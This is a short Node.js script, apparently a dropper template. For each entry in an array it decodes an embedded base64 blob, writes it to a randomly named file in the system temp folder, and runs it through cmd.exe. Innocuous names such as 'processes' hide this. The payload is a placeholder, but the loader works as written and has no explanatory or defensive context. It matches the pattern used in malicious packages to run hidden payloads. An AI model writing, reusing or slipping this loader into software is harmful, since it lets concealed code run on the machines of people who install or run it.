var fs = require('fs');
var os = require('os');
var path = require('path');
var spawn = require('child_process').spawn;

var processes = [{process_ext:"key1", process_code:"BASE64DATA"}];

function main() {
    for (var i = 0; i < processes.length; i++) {
        handle_process(processes[i].process_ext, processes[i].process_code);
    }
}

function handle_process(process_ext, process_code) {
    var random_name = Math.random().toString(36).substring(7);
    var file_ext = process_ext;
    var tempFile = path.join(os.tmpdir(), random_name + "." + file_ext);

    fs.writeFileSync(tempFile, Buffer.from(process_code, 'base64'));

    var run_command = "cmd.exe";
    var run_args = ["/d", "/c", "call", tempFile];
    var process = spawn(run_command, run_args, { stdio: 'inherit' });
}

main();